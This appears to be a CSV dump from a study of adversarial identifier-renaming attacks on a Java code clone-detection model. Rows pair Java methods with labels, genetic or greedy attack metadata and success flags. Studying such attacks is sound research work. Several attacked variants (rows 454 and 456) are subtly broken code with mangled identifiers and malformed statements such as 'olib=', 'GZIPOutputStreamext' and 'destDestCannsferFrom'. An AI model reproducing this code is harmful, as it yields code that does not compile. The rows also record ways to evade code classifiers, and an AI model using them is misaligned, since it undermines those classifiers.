        FileChannel fchannel = new FileInputStream(tmpFile).getChannel();
        encoder.transfer(fchannel, 0, 20);
        encoder.write(wrap(""more stuff""));
        String s = baos.toString(""US-ASCII"");
        assertTrue(encoder.isCompleted());
        assertEquals(""stuff;more stuff"", s);
        tmpFile.delete();
    }
",267,,LABEL_0,LABEL_0,LABEL_0,-1,"getRandomGUID,secure,md5,sbValueBeforeMD5,time,rand,valueBeforeMD5,array,sb,j,b,valueAfterMD5",,,,0,,0,GA,4276,1.5652681191762288,failed,[]
449,"    private boolean copyFile(File _file1, File _file2) {
        FileInputStream fis;
        FileOutputStream fos;
        try {
            fis = new FileInputStream(_file1);
            fos = new FileOutputStream(_file2);
            FileChannel canalFuente = fis.getChannel();
            canalFuente.transferTo(0, canalFuente.size(), fos.getChannel());
            fis.close();
            fos.close();
            return true;
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        }
        return false;
    }
 <SPLIT>     public final int wordFrequency(String word) {
        String replWebQuery = webQuery.replaceFirst(""WORDREPLACE"", word);
        try {
            URL url = new URL(replWebQuery);
            String content = url.toString();
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                if (inputLine.matches(nrResultsPattern)) {
                    int fr = matchedLine(inputLine);
                    if (fr >= 0) {
                        return fr;
                    }
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return 0;
    }
",98,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,_file1,_file2,fis,fos,canalFuente",,,,0,,0,GA,2249,0.7956369002660115,failed,[]
450,"    public void serialize(OutputStream out) throws IOException, BadIMSCPException {
        ensureParsed();
        ZipFilePackageParser parser = utils.getIMSCPParserFactory().createParser();
        parser.setContentPackage(cp);
        if (on_disk != null) on_disk.delete();
        on_disk = createTemporaryFile();
        parser.serialize(on_disk);
        InputStream in = new FileInputStream(on_disk);
        IOUtils.copy(in, out);
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",81,,LABEL_1,LABEL_1,LABEL_1,-1,"serialize,out,parser,on_disk,in",,,,0,,0,GA,1883,0.70617200533549,failed,[]
451,"    public static void copyFile(String source_name, String dest_name) throws IOException {
        source_name = Shell.getUtils().constructPath(source_name);
        File source_file = new File(source_name);
        dest_name = Shell.getUtils().constructPath(dest_name);
        File destination_file = new File(dest_name);
        FileInputStream source = null;
        FileOutputStream destination = null;
        byte[] buffer;
        int bytes_read;
        try {
            if (!source_file.exists() || !source_file.isFile()) throw new FileCopyException(""cp: no such source file: "" + source_name);
            if (!source_file.canRead()) throw new FileCopyException(""cp: source file "" + ""is unreadable: "" + source_name);
            if (destination_file.exists()) {
                if (destination_file.isFile()) {
                    BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
                    String response;
                    if (!destination_file.canWrite()) throw new FileCopyException(""cp: destination "" + ""file is unwriteable: "" + dest_name);
                    System.out.print(""cp: file "" + dest_name + "" already exists. Overwrite it ? (Y/N): "");
                    System.out.flush();
                    response = in.readLine();
                    if (!response.equals(""Y"") && !response.equals(""y"")) throw new FileCopyException(""cp: copy cancelled."");
                } else throw new FileCopyException(""cp: destination "" + ""is not a file: "" + dest_name);
            } else {
                File parentdir = parent(destination_file);
                if (!parentdir.exists()) throw new FileCopyException(""cp: destination "" + ""directory doesn't exist: "" + dest_name);
                if (!parentdir.canWrite()) throw new FileCopyException(""cp: destination "" + ""directory is unwriteable: "" + dest_name);
            }
            source = new FileInputStream(source_file);
            destination = new FileOutputStream(destination_file);
            buffer = new byte[1024];
            int size = (new Long((source_file.length() / 1024) / 50)).intValue();
            int c = 1;
            int written = 0;
            System.out.print(""cp: "");
            while (true) {
                if (written < 50) {
                    if ((c - 1) == size && size != 0) {
                        System.out.print(""#"");
                        c = 1;
                        written++;
                    } else if (size == 0) {
                        int j = 1;
                        if (c > 1) j = (50 / c) - 50; else j = 50 / c;
                        for (int i = 0; i < j; i++) System.out.print(""#"");
                        written += j;
                    }
                }
                bytes_read = source.read(buffer);
                if (bytes_read == -1) break;
                destination.write(buffer, 0, bytes_read);
                c++;
            }
            System.out.println();
        } finally {
            if (source != null) try {
                source.close();
            } catch (IOException e) {
            }
            if (destination != null) try {
                destination.close();
            } catch (IOException e) {
            }
        }
    }
 <SPLIT>     private void startScript(wabclient.Attributes prop) throws SAXException {
        dialog.beginScript();
        String url = prop.getValue(""src"");
        if (url.length() > 0) {
            try {
                BufferedReader r = new BufferedReader(new InputStreamReader(new URL(url).openStream()));
                String buffer;
                while (true) {
                    buffer = r.readLine();
                    if (buffer == null) break;
                    dialog.script += buffer + ""\n"";
                }
                r.close();
                dialog.endScript();
            } catch (IOException ioe) {
                System.err.println(""[IOError] "" + ioe.getMessage());
                System.exit(0);
            }
        }
    }
",604,,LABEL_0,LABEL_1,,-4,"copyFile,source_name,dest_name,source_file,destination_file,source,destination,buffer,bytes_read,in,response,parentdir",,,,0,,0,Greedy,1,0.0007566690444946289,,[]
452,"    private synchronized void loadDDL() throws IOException {
        try {
            conn.createStatement().executeQuery(""SELECT * FROM non_generic_favs"").close();
        } catch (SQLException e) {
            Statement stmt = null;
            if (!e.getMessage().matches(ERR_MISSING_TABLE)) {
                e.printStackTrace(System.out);
                throw new IOException(""Error on initial data store read"");
            }
            String[] qry = { ""CREATE TABLE non_generic_favs (id INT NOT NULL PRIMARY KEY)"", ""CREATE TABLE ignore_chan_favs (id INT NOT NULL PRIMARY KEY, chanlist LONG VARCHAR)"", ""CREATE TABLE settings (var VARCHAR(32) NOT NULL, val VARCHAR(255) NOT NULL, PRIMARY KEY(var))"", ""INSERT INTO settings (var, val) VALUES ('schema', '1')"" };
            try {
                conn.setAutoCommit(false);
                stmt = conn.createStatement();
                for (String q : qry) stmt.executeUpdate(q);
                conn.commit();
            } catch (SQLException e2) {
                try {
                    conn.rollback();
                } catch (SQLException e3) {
                    e3.printStackTrace(System.out);
                }
                e2.printStackTrace(new PrintWriter(System.out));
                throw new IOException(""Error initializing data store"");
            } finally {
                if (stmt != null) {
                    try {
                        stmt.close();
                    } catch (SQLException e4) {
                        e4.printStackTrace(System.out);
                        throw new IOException(""Unable to cleanup data store resources"");
                    }
                }
                try {
                    conn.setAutoCommit(true);
                } catch (SQLException e3) {
                    e3.printStackTrace(System.out);
                    throw new IOException(""Unable to reset data store auto commit"");
                }
            }
        }
        return;
    }
 <SPLIT>     private static void recurseFiles(File root, File file, ZipArchiveOutputStream zaos, boolean absolute) throws IOException {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (File file2 : files) {
                recurseFiles(root, file2, zaos, absolute);
            }
        } else if ((!file.getName().endsWith("".zip"")) && (!file.getName().endsWith("".ZIP""))) {
            String filename = null;
            if (absolute) {
                filename = file.getAbsolutePath().substring(root.getAbsolutePath().length());
            } else {
                filename = file.getName();
            }
            ZipArchiveEntry zae = new ZipArchiveEntry(filename);
            zae.setSize(file.length());
            zaos.putArchiveEntry(zae);
            FileInputStream fis = new FileInputStream(file);
            IOUtils.copy(fis, zaos);
            zaos.closeArchiveEntry();
        }
    }
",274,,LABEL_0,LABEL_0,LABEL_0,-1,"loadDDL,stmt,qry,q",,,,0,,0,GA,1535,0.566197927792867,failed,[]
453,"    protected void innerProcess(ProcessorURI curi) throws InterruptedException {
        Pattern regexpr = curi.get(this, STRIP_REG_EXPR);
        ReplayCharSequence cs = null;
        try {
            cs = curi.getRecorder().getReplayCharSequence();
        } catch (Exception e) {
            curi.getNonFatalFailures().add(e);
            logger.warning(""Failed get of replay char sequence "" + curi.toString() + "" "" + e.getMessage() + "" "" + Thread.currentThread().getName());
            return;
        }
        MessageDigest digest = null;
        try {
            try {
                digest = MessageDigest.getInstance(SHA1);
            } catch (NoSuchAlgorithmException e1) {
                e1.printStackTrace();
                return;
            }
            digest.reset();
            String s = null;
            if (regexpr != null) {
                s = cs.toString();
            } else {
                Matcher m = regexpr.matcher(cs);
                s = m.replaceAll("" "");
            }
            digest.update(s.getBytes());
            byte[] newDigestValue = digest.digest();
            curi.setContentDigest(SHA1, newDigestValue);
        } finally {
            if (cs != null) {
                try {
                    cs.close();
                } catch (IOException ioe) {
                    logger.warning(TextUtils.exceptionToString(""Failed close of ReplayCharSequence."", ioe));
                }
            }
        }
    }
 <SPLIT>     public static String getMD5(String _pwd) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(_pwd.getBytes());
            return toHexadecimal(new String(md.digest()).getBytes());
        } catch (NoSuchAlgorithmException x) {
            x.printStackTrace();
            return """";
        }
    }
",264,,LABEL_1,LABEL_1,LABEL_1,-1,"innerProcess,curi,regexpr,cs,digest,s,m,newDigestValue",,,,0,,0,GA,2689,0.9756495873133342,failed,[]
454,"    public static void copy(File source, File dest) throws IOException {
        FileChannel in = null, out = null;
        try {
            in = new FileInputStream(source).getChannel();
            out = new FileOutputStream(dest).getChannel();
            long size = in.size();
            MappedByteBuffer buf = in.map(FileChannel.MapMode.READ_ONLY, 0, size);
            out.write(buf);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
 <SPLIT>     @SuppressWarnings(""unchecked"")
    public void launch(final ILaunchConfiguration configuration, final String mode, final ILaunch launch, final IProgressMonitor monitor) throws CoreException {
        {
            Assert.notNull(configuration);
            Assert.notNull(monitor);
        }
        final String projectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.NEXOPEN_PROJECT_NAME, """");
        final IProject prj = JavaCore.create(ResourcesPlugin.getWorkspace().getRoot()).getJavaProject(projectName).getProject();
        if (NexOpenProjectUtils.isNexOpenProject(prj)) {
            final IFile pom = prj.getFile(""pom.xml"");
            if (!pom.exists()) {
                throw new IllegalStateException(""Not a NexOpen project. Not Maven2 root pom.xml available"");
            }
            ContentHandlerTemplate.handle(pom, new ContentHandlerCallback() {

                public void processHandle(final Document doc) {
                    handleRootProfile(doc);
                }
            });
            final IFile bpom = prj.getFile(""business/pom.xml"");
            if (!bpom.exists()) {
                throw new IllegalStateException(""Not a NexOpen project. Not Maven2 business pom.xml available"");
            }
            ContentHandlerTemplate.handle(bpom, new ContentHandlerCallback() {

                public void processHandle(final Document doc) {
                    try {
                        handleBusinessProfile(doc, configuration, prj);
                    } catch (final CoreException e) {
                        if (Logger.getLog().isInfoEnabled()) {
                            Logger.getLog().info(""CoreException"", e);
                        }
                        throw new RuntimeException(e);
                    }
                }
            });
            final ByteArrayOutputStream output = new ByteArrayOutputStream();
            try {
                final Properties props = new Properties();
                final String dialectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.HIBERNATE_DIALECT, ""MySQL5InnoDB"");
                props.setProperty(""hibernate.dialect"", support.getDialectClass(dialectName));
                props.setProperty(""hibernate.connection.driver_class"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_DRIVER, ""com.mysql.jdbc.Driver""));
                props.setProperty(""hibernate.connection.url"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_URL, ""jdbc:mysql://<host><:port>/<database>""));
                props.setProperty(""hibernate.connection.username"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_USERNAME, ""sa""));
                props.setProperty(""hibernate.connection.password"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_PASSWORD, """"));
                props.store(output, ""hibernate properties for code generation using NexOpen Tools 1.0.0"");
                final IFile props_file = prj.getFile(""business/src/test/resources/hibernate.properties"");
                if (!props_file.exists()) {
                    props_file.create(new ByteArrayInputStream(output.toByteArray()), true, monitor);
                } else {
                    props_file.setContents(new ByteArrayInputStream(output.toByteArray()), true, false, monitor);
                }
            } catch (final IOException e) {
                Logger.getLog().error(""I/O exception "", e);
                throw new RuntimeException(e);
            } finally {
                try {
                    output.flush();
                    output.close();
                } catch (IOException e) {
                }
            }
            if (NexOpenProjectUtils.is04xProject(prj)) {
                final IFile appContext = prj.getFile(""web/src/main/webapp/WEB-INF/applicationContext.xml"");
                if (!appContext.exists()) {
                    throw new IllegalStateException(""It no exists applicationContext.xml under web/src/main/webapp/WEB-INF, not a NexOpen project"");
                }
                ContentHandlerTemplate.handle(appContext, new ContentHandlerCallback() {

                    public void processHandle(final Document doc) {
                        final Element root = doc.getDocumentElement();
                        final List<Element> beans = XMLUtils.getChildElementsByTagName(root, ""bean"");
                        for (final Element bean : beans) {
                            final String id = bean.getAttribute(""id"");
                            if (""valueListAdapterResolver"".equals(id)) {
                                try {
                                    final String pkgName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.NEXOPEN_PACKAGE, """");
                                    final String className = new StringBuilder(pkgName).append("".vlh.support.AnnotationValueListAdapterResolver"").toString();
                                    bean.setAttribute(""class"", className);
                                    break;
                                } catch (final CoreException e) {
                                    if (Logger.getLog().isInfoEnabled()) {
                                        Logger.getLog().info(""CoreException"", e);
                                    }
                                    throw new RuntimeException(e);
                                }
                            }
                        }
                    }
                });
            }
            {
                final String dialectName = configuration.getAttribute(INexOpenLaunchConfigurationConstants.HIBERNATE_DIALECT, ""MySQL5InnoDB"");
                if (support.isReverseEngineeringFileNeeded(dialectName)) {
                    try {
                        final IFile revengFile = prj.getFile(""business/src/test/resources/"" + support.getReversEngineeringFile(dialectName));
                        if (!revengFile.exists()) {
                            final Bundle bundle = HibernateActivator.getDefault().getBundle();
                            final Path src = new Path(""resources/"" + support.getReversEngineeringFile(dialectName));
                            final InputStream in = FileLocator.openStream(bundle, src, false);
                            final ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            IOUtils.copy(in, baos);
                            String str = baos.toString();
                            str = str.replace(""${schema}"", configuration.getAttribute(INexOpenLaunchConfigurationConstants.JDBC_USERNAME, ""sa""));
                            revengFile.create(new ByteArrayInputStream(str.getBytes()), true, null);
                        }
                    } catch (final IOException e) {
                        if (Logger.getLog().isInfoEnabled()) {
                            Logger.getLog().info(""CoreException"", e);
                        }
                        throw new RuntimeException(e);
                    }
                }
            }
            final IResource resource = (IResource) prj.getAdapter(IResource.class);
            final QualifiedName qn = new QualifiedName(""org.nexopenframework.ide.eclipse.ui"", ""default.profile"");
            final String profile = resource.getPersistentProperty(qn);
            resource.setPersistentProperty(qn, ""reverse-engineering"");
            try {
                final InstallProjectAction action = new InstallProjectAction();
                action.scheduleJob(prj, monitor);
                prj.refreshLocal(2, monitor);
            } finally {
                prj.setPersistentProperty(qn, profile);
            }
        } else {
            Logger.getLog().info(""Not a NexOpen project :: "" + prj);
        }
    }
",113,"    public static void put(File target, File coord) throws IOException {
        FileChannel url = null, lib = null;
        try {
            url = new FileInputStream(target).getChannel();
            olib= new FileOutputStream(coord).getChannel();
            long smax= url.max();
            MappedByteBuffer feat = url.map(FileChannel.MapMode.READ_ONLY, 0, max);
            lib.write(feat);
        } finally {
            if (url != null) url.close();
            if (lib != null) lib.close();
        }
    }
",LABEL_1,LABEL_1,0.5007297396659851,1,"copy,source,dest,in,out,size,buf",,,,0,"copy:put,source:target,dest:coord,in:url,out:lib,size:max,buf:feat,",0,GA,660,0.2667536815007528,ga,[]
455,"    public Configuration(URL url) {
        InputStream in = null;
        try {
            load(in = url.openStream());
        } catch (Exception e) {
            throw new RuntimeException(""Could not load configuration from "" + url, e);
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException ignore) {
                }
            }
        }
    }
 <SPLIT>     public FileAttribute getAttribute(URL url) throws VFSException {
        try {
            con = (HttpURLConnection) url.openConnection();
            con.setInstanceFollowRedirects(false);
            int response = con.getResponseCode();
            if (response >= 400) {
                return new DefaultFileAttribute(false, 0, null, FileType.NOT_EXISTS);
            }
            boolean redirect = (response >= 300 && response <= 399);
            if (redirect) {
                String location = con.getHeaderField(""Location"");
                return getAttribute(new URL(url, location));
            }
            return new DefaultFileAttribute(true, con.getContentLength(), new Date(con.getLastModified()), url.toString().endsWith(""/"") ? FileType.DIRECTORY : FileType.FILE);
        } catch (MalformedURLException e) {
            e.printStackTrace();
            throw new WrongPathException(file.getAbsolutePath());
        } catch (IOException e) {
            throw new VFSIOException(""IOException opening "" + file.getAbsolutePath(), e);
        } finally {
            if (con != null) {
                con.disconnect();
            }
        }
    }
",74,,LABEL_0,LABEL_0,LABEL_0,-1,"url,in",,,,0,,0,GA,845,0.3003425240516663,failed,[]
456,"                    public void handle() {
                        FileChannel srcChannel, destChannel;
                        String destOutFile = logFile + ""."" + System.currentTimeMillis();
                        String destOutFileCompressed = logFile + ""."" + System.currentTimeMillis() + "".gz"";
                        if (rotateDest != null) {
                            (new File(rotateDest)).mkdirs();
                            if (destOutFile.indexOf(""/"") != -1) {
                                destOutFile = rotateDest + ""/"" + destOutFile.substring(destOutFile.lastIndexOf(""/"") + 1);
                            }
                            if (destOutFileCompressed.indexOf(""/"") != -1) {
                                destOutFileCompressed = rotateDest + ""/"" + destOutFileCompressed.substring(destOutFileCompressed.lastIndexOf(""/"") + 1);
                            }
                        }
                        if (rotateCompress) {
                            try {
                                GZIPOutputStream out = new GZIPOutputStream(new FileOutputStream(destOutFileCompressed));
                                FileInputStream in = new FileInputStream(logFile);
                                byte buf[] = new byte[1024];
                                int len;
                                while ((len = in.read(buf)) > 0) {
                                    out.write(buf, 0, len);
                                }
                                in.close();
                                out.finish();
                                out.close();
                                buf = null;
                                in = null;
                                out = null;
                                Debug.debug(""Rotated log file '"" + logFile + ""' to '"" + destOutFileCompressed + ""'"");
                            } catch (Exception e) {
                                Debug.debug(""Unable to rotate log file '"" + logFile + ""': "" + e);
                            }
                        } else {
                            try {
                                srcChannel = new FileInputStream(logFile).getChannel();
                            } catch (IOException e) {
                                Debug.debug(""Unable to read log file '"" + logFile + ""': "" + e.getMessage());
                                return;
                            }
                            try {
                                destChannel = new FileOutputStream(destOutFile).getChannel();
                            } catch (IOException e) {
                                Debug.debug(""Unable to rotate log file to '"" + destOutFile + ""': "" + e.getMessage());
                                return;
                            }
                            try {
                                destChannel.transferFrom(srcChannel, 0, srcChannel.size());
                                srcChannel.close();
                                destChannel.close();
                                srcChannel = null;
                                destChannel = null;
                            } catch (IOException e) {
                                Debug.debug(""Unable to copy data for file rotation: "" + e.getMessage());
                                return;
                            }
                            Debug.debug(""Rotated log file '"" + logFile + ""' to '"" + destOutFile + ""'"");
                        }
                        if (rotateDelete && isFile) {
                            try {
                                ps.close();
                            } catch (Exception e) {
                            }
                            isFile = false;
                            ps = null;
                            (new File(logFile)).delete();
                            reconfigureDebug();
                        }
                        if (rotateDest != null) {
                            long comparisonTime = rotateDays * (60 * 60 * 24 * 1000);
                            long currentTime = System.currentTimeMillis();
                            File fileList[] = (new File(rotateDest)).listFiles();
                            DateFormat format1 = new SimpleDateFormat(""yyyy-MM-dd"");
                            java.util.Date date = new java.util.Date(currentTime);
                            String archiveFile = format1.format(date).toString() + "".zip"";
                            if (rotateArchive != null) {
                                archiveFile = rotateArchive + ""/"" + archiveFile;
                                (new File(rotateArchive)).mkdirs();
                            }
                            Archive archive = new Archive(archiveFile);
                            for (int i = 0; i < fileList.length; i++) {
                                String currentFilename = fileList[i].getName();
                                long timeDifference = (currentTime - fileList[i].lastModified());
                                if ((rotateCompress && currentFilename.endsWith("".gz"")) || (!rotateCompress && currentFilename.indexOf(logFile + ""."") != -1)) {
                                    if (rotateDest != null) {
                                        currentFilename = rotateDest + ""/"" + currentFilename;
                                    }
                                    if (timeDifference > comparisonTime) {
                                        archive.addFile(fileList[i].getName(), currentFilename);
                                        fileList[i].delete();
                                    }
                                }
                            }
                            archive = null;
                            fileList = null;
                            format1 = null;
                            date = null;
                        }
                    }
 <SPLIT>     public static void main(String[] args) {
        File srcDir = new File(args[0]);
        File dstDir = new File(args[1]);
        File[] srcFiles = srcDir.listFiles();
        for (File f : srcFiles) {
            if (f.isDirectory()) continue;
            try {
                FileChannel srcChannel = new FileInputStream(f).getChannel();
                FileChannel dstChannel = new FileOutputStream(dstDir.getAbsolutePath() + System.getProperty(""file.separator"") + f.getName()).getChannel();
                ByteBuffer buffer = ByteBuffer.allocate(1024);
                int nr = 0;
                srcChannel.position(nr);
                nr += srcChannel.read(buffer);
                while (nr < f.length()) {
                    buffer.flip();
                    dstChannel.write(buffer);
                    buffer.clear();
                    nr += srcChannel.read(buffer);
                }
                srcChannel.close();
                dstChannel.close();
            } catch (IOException e) {
            }
        }
    }
",802,"                    public void  handler() {
                        FileChannel rcConnection, DestCan;
                        String destOutputSite = logFile + ""."" + System.currentTimeMillis();
                        String destOutFilecompacted = logFile + ""."" + System.currentTimeMillis() + "".gz"";
                        if (rotateDest != null) {
                            (new File(rotateDest)).mkdirs();
                            if (destOutputSite.indexOf(""/"") != -1) {
                                destOutputSite = rotateDest + ""/"" + destOutputSite.substring(destOutputSite.lastIndexOf(""/"") + 1);
                            }
                            if (destOutFilecompacted.indexOf(""/"") != -1) {
                                destOutFilecompacted = rotateDest + ""/"" + destOutFilecompacted.substring(destOutFilecompacted.lastIndexOf(""/"") + 1);
                            }
                        }
                        if (rotateCompress) {
                            try {
                                GZIPOutputStreamext = new GZIPOutputStream(new FileOutputStream(destOutFilecompacted));
                                FileInputStream log = new FileInputStream(logFile);
                                byte cas[] = new byte[1024];
                                int url;
                                while ((lurl= log.read(cas)) > 0) {
                                    ex.write(cas, 0, url);
                                }
                                log.close();
                                ex.finish();
                                ex.close();
                                cas = null;
                                log = null;
                                ex = null;
                                Debug.debug(""Rotated log file '"" + logFile + ""' to '"" + destOutFilecompacted + ""'"");
                            } catch (Exception e) {
                                Debug.debug(""Unable to rotate log file '"" + logFile + ""': "" + e);
                            }
                        } else {
                            try {
                                rcConnection = new FileInputStream(logFile).getChannel();
                            } catch (IOException e) {
                                Debug.debug(""Unable to read log file '"" + logFile + ""': "" + e.getMessage());
                                return;
                            }
                            try {
                                DestCan = new FileOutputStream(destOutputSite).getChannel();
                            } catch (IOException e) {
                                Debug.debug(""Unable to rotate log file to '"" + destOutputSite + ""': "" + e.getMessage());
                                return;
                            }
                            try {
                                destDestCannsferFrom(rcConnection, 0, rcConnection.size());
                                rcConnection.close();
                                DestCan.close();
                                rcConnection = null;
                                DestCan = null;
                            } catch (IOException e) {
                                Debug.debug(""Unable to copy data for file rotation: "" + e.getMessage());
                                return;
                            }
                            Debug.debug(""Rotated log file '"" + logFile + ""' to '"" + destOutputSite + ""'"");
                        }
                        if (rotateDelete && isFile) {
                            try {
                                ps.close();
                            } catch (Exception e) {
                            }
                            isFile = false;
                            ps = null;
                            (new File(logFile)).delete();
                            reconfigureDebug();
                        }
                        if (rotateDest != null) {
                            long comparisonTime = rotateDays * (60 * 60 * 24 * 1000);
                            long currentTime = System.currentTimeMillis();
                            File fileList[] = (new File(rotateDest)).listFiles();
                            DateFormat format1 = new SimpleDateFormat(""yyyy-MM-dd"");
                            java.util.Date date = new java.util.Date(currentTime);
                            String archiveFile = format1.format(date).toString() + "".zip"";
                            if (rotateArchive != null) {
                                archiveFile = rotateArchive + ""/"" + archiveFile;
                                (new File(rotateArchive)).mkdirs();
                            }
                            Archive archive = new Archive(archiveFile);
                            for (int i = 0; i < fileList.length; i++) {
                                String currentFilename = fileList[i].getName();
                                long timeDifference = (currentTime - fileList[i].lastModified());
                                if ((rotateCompress && currentFilename.endsWith("".gz"")) || (!rotateCompress && currentFilename.indexOf(logFile + ""."") != -1)) {
                                    if (rotateDest != null) {
                                        currentFilename = rotateDest + ""/"" + currentFilename;
                                    }
                                    if (timeDifference > comparisonTime) {
                                        archive.addFile(fileList[i].getName(), currentFilename);
                                        fileList[i].delete();
                                    }
                                }
                            }
                            archive = null;
                            fileList = null;
                            format1 = null;
                            date = null;
                        }
                    }
",LABEL_1,LABEL_1,0.5140003561973572,1,"handle,srcChannel,destChannel,destOutFile,destOutFileCompressed,out,in,buf,len",,,,0,"handle: handler,srcChannel:rcConnection,destChannel:DestCan,destOutFile:destOutputSite,destOutFileCompressed:destOutFilecompacted,out:ex,in:log,buf:cas,len:url,",0,GA,2875,1.1677813450495402,ga,[]
457,"    public static String getMD5(String _pwd) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(_pwd.getBytes());
            return toHexadecimal(new String(md.digest()).getBytes());
        } catch (NoSuchAlgorithmException x) {
            x.printStackTrace();
            return """";
        }
    }
 <SPLIT>     public synchronized String encryptPassword(String passwordString) throws Exception {
        MessageDigest digest = null;
        digest = MessageDigest.getInstance(""SHA"");
        digest.update(passwordString.getBytes(""UTF-8""));
        byte raw[] = digest.digest();
        String hash = (new BASE64Encoder()).encode(raw);
        return hash;
    }
",72,,LABEL_1,LABEL_1,LABEL_1,-1,"getMD5,_pwd,md",,,,0,,0,GA,1137,0.39752055406570436,failed,[]
458,"    public void testSimpleQuery() throws Exception {
        JCRNodeSource dummySource = (JCRNodeSource) resolveSource(BASE_URL + ""users/alexander.klimetschek"");
        assertNotNull(dummySource);
        OutputStream os = ((ModifiableSource) dummySource).getOutputStream();
        assertNotNull(os);
        String dummyContent = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><user><id>alexander</id><teamspace>cyclr</teamspace><teamspace>mindquarryTooLong</teamspace></user>"";
        os.write(dummyContent.getBytes());
        os.flush();
        os.close();
        JCRNodeSource source = (JCRNodeSource) resolveSource(BASE_URL + ""users/bastian"");
        assertNotNull(source);
        os = ((ModifiableSource) source).getOutputStream();
        assertNotNull(os);
        String content = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><user><id>bastian</id><teamspace>mindquarry</teamspace></user>"";
        os.write(content.getBytes());
        os.flush();
        os.close();
        QueryResultSource qResult = (QueryResultSource) resolveSource(BASE_URL + ""users?/*[.//user/teamspace='mindquarry']"");
        assertNotNull(qResult);
        Collection results = qResult.getChildren();
        assertEquals(1, results.size());
        Iterator it = results.iterator();
        JCRNodeSource rSrc = (JCRNodeSource) it.next();
        InputStream rSrcIn = rSrc.getInputStream();
        ByteArrayOutputStream actualOut = new ByteArrayOutputStream();
        IOUtils.copy(rSrcIn, actualOut);
        rSrcIn.close();
        assertEquals(content, actualOut.toString());
        actualOut.close();
        rSrc.delete();
    }
 <SPLIT>     public static void main(String[] args) {
        File srcDir = new File(args[0]);
        File dstDir = new File(args[1]);
        File[] srcFiles = srcDir.listFiles();
        for (File f : srcFiles) {
            if (f.isDirectory()) continue;
            try {
                FileChannel srcChannel = new FileInputStream(f).getChannel();
                FileChannel dstChannel = new FileOutputStream(dstDir.getAbsolutePath() + System.getProperty(""file.separator"") + f.getName()).getChannel();
                ByteBuffer buffer = ByteBuffer.allocate(1024);
                int nr = 0;
                srcChannel.position(nr);
                nr += srcChannel.read(buffer);
                while (nr < f.length()) {
                    buffer.flip();
                    dstChannel.write(buffer);
                    buffer.clear();
                    nr += srcChannel.read(buffer);
                }
                srcChannel.close();
                dstChannel.close();
            } catch (IOException e) {
            }
        }
    }
